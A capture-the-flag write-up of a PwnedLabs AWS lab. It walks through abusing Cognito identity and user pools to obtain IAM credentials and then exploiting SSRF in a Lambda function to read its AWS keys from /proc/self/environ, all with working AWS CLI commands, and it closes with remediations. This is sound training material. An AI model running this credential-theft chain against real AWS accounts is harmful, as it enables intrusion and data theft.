## Disclosure
This documentation is intended for educational purposes only. All activities were performed within a controlled, authorized environment provided by [PwnedLabs](https://pwnedlabs.io/). This write-up focuses strictly on the methodology, vulnerability analysis, and security remediation techniques. All sensitive identifiers, including credentials, tokens, and specific PII, have been redacted or generalized to comply with security best practices and the platform's Terms of Service. The intent of this content is to foster professional development and contribute to the cybersecurity community's knowledge base.

**The lab:** https://pwnedlabs.io/labs/abuse-cognito-user-and-identity-pools

---
## Vulnerability Summary
The environment is vulnerable to a multi-stage exploit chain originating from 
improperly secured Amazon Cognito configurations and a Server-Side Request 
Forgery (SSRF) vulnerability within an AWS Lambda function.

1. **Credential Acquisition**: Hardcoded Cognito Identity Pool IDs allow 
   unauthenticated access to temporary IAM credentials.
2. **Privilege Escalation**: Manipulation of Cognito User Pool flows allows 
   authentication as a user, enabling access to more permissive IAM roles.
3. **SSRF & File Read**: The downstream Lambda function fails to sanitize the 
   target input parameter, allowing an attacker to use `file://` protocols to 
   read the Lambda execution environment's environment variables.
4. **Impact**: Exfiltration of valid IAM credentials from the Lambda environment 
   leads to unauthorized access to sensitive S3 buckets and corporate 
   confidential data (e.g., Disaster Recovery plans).

---
## Walkthrough
Source code leaks a Cognito Identity Pool ID with a reference to an S3 bucket named `hl-app-images`. We can try to request a unique Identity ID by providing the Identity Pool ID from the source code:

```bash
aws cognito-identity get-id --identity-pool-id us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 --no-sign
	IdentityId
```

Now with this ID, we can request credentials for it and authenticate:

```bash
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
	Access Key
	Secret Key
	Session Token
aws configure --profile cognito
aws sts get-caller-identity
```

Enumerate the S3 bucket:

```bash
aws s3 ls hl-app-images --profile cognito
	temp/
aws s3 ls hl-app-images/temp/ --profile cognito
	id_rsa
aws s3 cp s3://hl-app-images/temp/id_rsa . --profile cognito
```

With the SSH key, we can enumerate further in the EC2 instances or other hosts.

---

A publicly exposed Cognito-hosted UI for a web app was also discovered. It is associated with a Cognito User Pool. With the client id (found in the URL that was exposed), we can enumerate users that already exist:

```bash
aws cognito-idp sign-up --client-id <id> --username test --password 'Password123!'
	UserConfirmed false
aws cognito-idp initiate-auth --client-id <id> --auth-flow USER_PASSWORD_AUTH --auth-parameters USERNAME=test,PASSWORD=Password123!
	UserNotConfirmedException
```

In case `Allow Cognito to automatically send messages to verify and confirm` is configured (`UserNotConfirmedException`), we can send a verification code:

```bash
aws cognito-idp sign-up --client-id <id> --username test_user --password <password> --user-attributes Name="email",Value="<email>" Name="name",Value="Test"
	json stating email delivery
```

The below command can provide the code and confirm our account, no output is returned:

```bash
aws cognito-idp confirm-sign-up --client-id <id> --username test_user --confirmation-code <Email_Code>       # No output, verifies account
```

Then, we can get a valid JWT and decode the values:

```bash
aws cognito-idp initiate-auth --client-id <client_id> --auth-flow USER_PASSWORD_AUTH --auth-parameters USERNAME=test_user,PASSWORD=<password>
	AccessToken
	RefreshToken
	IdToken
```

Using `jwt.io` we can see theat the AccessToken contains the token issuer (`iss`) which is the user pool ID! Using the command below with this information and the `IdToken`, we can `get-id` for the unique identity ID:

```bash
aws cognito-identity get-id --identity-pool-id "us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367" --logins "{ \"cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz\": \"<IdToken>\" }"                        # With slashes
	IdentityId
```

With this identity id, we can use the following command to get AWS credentials. Configure the credentials and authenticate:

```bash
aws cognito-identity get-credentials-for-identity --identity-id <identity-id> --logins "{ \"cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz\": \"<IdToken>\" }"
aws configure set aws_session_token '<SessionToken>' --profile cognito2
aws configure --profile cognito2
aws sts get-caller-identity --profile cognito2
```

Now, we can enumerate we that we have assumed the role `Cognito_StatusAppAuth_Role`. The role we had previous assumed was `Cognito_StatusAppNoauth_Role`, maybe we have more permissions now?:

```bash
aws iam list-role-policies --role-name Cognito_StatusAppAuth_Role --profile cognito2
aws iam list-attached-role-policies --role-name Cognito_StatusAppAuth_Role --profile cognito2
```

The attached policies show a default AWS-managed policy tied to this role. If we enumrate that further, we can get the version of the policy and retrieve the JSON policy document:

```bash
aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Status --profile cognito2
	v4
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Status --version-id v4 --profile cognito2
```

This reveals that we have permissions to list all Lambda functions (`ListFunctions`) in the account and can retrieve/invoke function code (`GetFunction` and `InvokeFunction`):

```bash
aws lambda list-functions --profile cognito2
aws lambda get-function --function-name huge-logistics-status --profile cognito2
	Location: <url>
```

With the location url, we can use `wget` and download the function configuration:

```bash
wget ''<Location_URL>' -O huge-logistics-status.zip                        # This lab is not resolving the URL and cannot proceed with download
```

The next steps:

After unzipping it we see the Python code below. The purpose of the function is to check the status of [http://huge-logistics.com](http://huge-logistics.com). Interesting from a security perspective is that we can invoke this Lambda function with an `event` argument that contains a 'target' key, setting the `target` variable to the associated value. If 'target' is not in the event dictionary, `target` will be set to `'http://huge-logistics.com'` by default.
  
```python
import os
import json
import urllib.request
from datetime import datetime
import boto3
import uuid

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    bucket_name = 'hl-status-log-bucket'

    try:
        target = event.get('target', 'http://huge-logistics.com')

        response = urllib.request.urlopen(target)
        data = response.read()
        return_status = 'Service is available.' if response.getcode() == 200 else 'Service is not available.'
        return {
            'statusCode': response.getcode(),
            'statusMessage': return_status,
            'body': data.decode('utf-8')
        }
    except urllib.error.HTTPError as e:
        return {
            'statusCode': e.code,
            'body': json.dumps({
                'message': 'HTTP error occurred.',
                'details': str(e)
            })
        }
    except Exception as e:
        debug_info = {
            'error_message': str(e),
            'request_time': datetime.utcnow().isoformat(),
            'requested_website': target,
            'event': event,
            'error_id': str(uuid.uuid4()),
        }
        debug_info_json = json.dumps(debug_info)

        # Try to upload to S3
        try:
            s3.put_object(Body=debug_info_json, Bucket=bucket_name, Key=f'debug_info_{context.aws_request_id}.json')
        except Exception as s3_e:
            print(f"Failed to upload debug info to S3: {str(s3_e)}")

        return {
            'statusCode': 500,
            'body': json.dumps({
                'message': 'Unexpected error occurred.',
                'debug_info': debug_info
            })
        }
```

This Lambda function suffers from Server-Side Request Forgery (SSRF) and Arbitrary File Read vulnerabilities because no validation is performed on the `target` parameter to ensure that it is safe and not an internal resource. SSRF can be a more dangerous vulnerability if the web host is an EC2 instance, however in this case it's a Lambda. In order to read arbitrary files we would need to specify the `file://` URL scheme.

First let's invoke the function with the default value.
  
```
aws lambda invoke --function-name huge-logistics-status response.json --profile cognito2
```

As expected this returns a 200 status code and the page HTML source code. We can validate the SSRF vulnerability by specifying another URL.

```
aws lambda invoke --function-name huge-logistics-status --payload '{ "target": "http://example.com" }' response.json --profile cognito2
strings response.json
```

💡 If you are using version 2 of the AWS CLI you might get the error `Invalid base64: "{ "target": "http://example.com" }"` on executing this command. In this case, you need to base64-encode the payload with the parameter `--cli-binary-format raw-in-base64-out`. The full v2 command is below. Use this format for any following Lambda invocations.

```
aws lambda invoke --cli-binary-format raw-in-base64-out --function-name huge-logistics-status --payload '{ "target": "http://example.com" }' response.json --profile cognito2
strings response.json
```

This is successful. Now let's try to exploit the arbitrary file read. A good choice for us in the context of AWS Lambda is `/proc/self/environ` as this file stores environment variables including AWS credentials used by the function.

```
aws lambda invoke --function-name huge-logistics-status --payload '{ "target": "file:///proc/self/environ" }' response.json --profile cognito2
strings response.json
```

We got access to the AWS keys! Set the new keys again and the token. `aws sts get-caller-identity` reveals our new execution context. Given that the S3 bucket was in the function code let's start there. Enumeration of the bucket reveals a temporary folder containing the AWS disaster recovery plan for Huge Logistics!

```
aws s3 ls hl-status-log-bucket --profile lambda
aws s3 ls hl-status-log-bucket/IT-Temp/ --profile lambda
aws s3 cp "s3://hl-status-log-bucket/IT-Temp/Huge Logistics Company_ AWS Disaster Recovery Plan.pdf" . --profile lambda
```

It includes the critical break glass account that allows access to a hot spare AWS account. PWNED!

---
## Remediations
1. **Secure Cognito Infrastructure**:
   - Implement the Principle of Least Privilege (PoLP) for Cognito Identity Pool 
     roles; avoid attaching broad managed policies.
   - Remove hardcoded Pool IDs and Client Secrets from client-side source code.

2. **Harden AWS Lambda**:
   - **Input Validation**: Implement strict allow-lists for all user-supplied inputs.
   - **Protocol Restriction**: Explicitly block the `file://` protocol and restrict 
     the function to authorized network destinations only.
   - **Network Isolation**: Deploy functions within a VPC and use Security Groups 
     to restrict egress traffic.

3. **Data & Secret Protection**:
   - Sensitive documents must not reside in buckets accessible by standard 
     application service roles.
   - Rotate credentials frequently and monitor for unusual `sts:GetCallerIdentity` 
     or `lambda:Invoke` activity.